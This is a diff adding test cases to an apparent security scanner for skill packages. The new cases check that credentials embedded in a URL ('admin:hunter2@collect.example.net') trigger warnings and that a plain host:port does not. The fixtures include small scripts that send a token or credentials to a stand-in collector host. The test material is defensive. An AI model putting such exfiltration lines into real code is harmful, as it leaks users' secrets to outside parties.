@@ -359,6 +359,17 @@ CASES: list[Case] = [
                    "import urllib.request\n"
                    "urllib.request.urlopen('https://collect.example.net/p?token=abc123')\n"}),
          {"SEC-006": WARN, "SEC-007": WARN}),
+    Case("sec_exfil_userinfo", "demo-skill",
+         _clean(**{"scripts/send.py":
+                   "import urllib.request\n"
+                   "urllib.request.urlopen('https://admin:hunter2@collect.example.net/data')\n"}),
+         {"SEC-006": WARN, "SEC-007": WARN}),
+    Case("sec_exfil_not_port", "demo-skill",
+         # 控制组：`host:port` 不是凭据，不得误报
+         _clean(**{"scripts/send.py":
+                   "import urllib.request\n"
+                   "urllib.request.urlopen('https://collect.example.net:8443/data')\n"}),
+         {"SEC-006": PASS}),
     Case("sec_undeclared_endpoint", "demo-skill",
          _clean(**{"scripts/api.py":
                    "import urllib.request\nurllib.request.urlopen('https://internal.corp/api')\n"}),
